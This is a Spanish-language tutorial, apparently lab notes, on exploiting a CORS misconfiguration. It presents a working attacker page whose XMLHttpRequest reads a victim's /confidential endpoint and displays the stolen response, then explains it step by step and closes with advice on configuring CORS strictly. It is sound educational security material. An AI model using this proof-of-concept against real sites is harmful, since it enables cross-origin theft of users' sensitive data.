
---

```js
<script>
	var req = new XMLHttpRequest();
	req.onload = reqListener;
	req.open('GET', 'http://localhost:5000/confidential', true);
	req.send();

	function reqListener() {
		document.getElementById("stoleInfo").innerHTML = req.responseText;
	}
</script>

<br>
<center><h1>Has sido hackeado, esta es la informaci&oacute;n que te he robado:</h1></center>

<p id="stoleInfo"></p>
```


# Explicación del Script JavaScript Usado en un Ataque de CORS

En esta sección vamos a analizar un pequeño script JavaScript que utilizamos como parte de un ataque de tipo CORS (Cross-Origin Resource Sharing). Este ataque tiene como objetivo explotar una configuración incorrecta de CORS en un servidor web para acceder a información sensible desde un origen distinto al autorizado.

## Objetivo del Script

Nuestro objetivo es enviar una petición desde un dominio controlado por nosotros hacia otro dominio vulnerable (por ejemplo, `http://localhost:5000`) y leer la respuesta si el servidor permite el intercambio de recursos entre orígenes de forma insegura.

## Análisis del Código

```html
<script>
	var req = new XMLHttpRequest();                // Creamos un objeto XMLHttpRequest para hacer una solicitud HTTP.
	req.onload = reqListener;                     // Definimos la función que se ejecutará cuando se cargue la respuesta.
	req.open('GET', 'http://localhost:5000/confidential', true);  // Preparamos una petición GET al recurso sensible.
	req.send();                                       // Enviamos la solicitud al servidor vulnerable.

	function reqListener() {
		document.getElementById("stoleInfo").innerHTML = req.responseText;
		// Cuando la respuesta llega, mostramos el contenido robado en la página HTML.
	}
</script>

<center><h1>Has sido hackeado, esta es la información que te he robado:</h1></center>

<p id="stoleInfo"></p>
````

## Paso a Paso

1. **Creamos la petición:** Utilizamos `XMLHttpRequest` para enviar una solicitud HTTP desde nuestro dominio (el atacante) hacia el dominio víctima (`localhost:5000`).
    
2. **Configuramos la solicitud:** Con el método `open()`, preparamos una petición `GET` dirigida a un endpoint potencialmente sensible como `/confidential`.
    
3. **Enviamos la solicitud:** Con `send()`, enviamos la petición al servidor objetivo.
    
4. **Procesamos la respuesta:** Cuando recibimos la respuesta, se ejecuta la función `reqListener()`, que inserta el contenido de la respuesta (`req.responseText`) en un elemento del DOM con el id `stoleInfo`.
    
5. **Mostramos la información robada:** Esta técnica permite que un atacante muestre en su propia página web información sensible obtenida desde otro dominio, siempre que la política CORS del servidor víctima sea vulnerable.
    

## Requisitos para que el ataque funcione

Este ataque solo es exitoso si el servidor objetivo permite solicitudes CORS desde cualquier origen (`Access-Control-Allow-Origin: *`) o desde el origen del atacante, **y** además permite que la respuesta sea accesible desde scripts de terceros.

## Conclusión

Este ejemplo demuestra cómo un fallo en la configuración de CORS puede llevar a la exposición de información sensible. Si un servidor no valida correctamente los orígenes permitidos, un atacante puede utilizar JavaScript malicioso para robar datos sin necesidad de explotar vulnerabilidades más complejas.

Como medida de protección, debemos asegurarnos de configurar CORS de forma estricta, permitiendo únicamente los orígenes que sean realmente necesarios y evitando exponer datos sensibles a solicitudes entre sitios.

---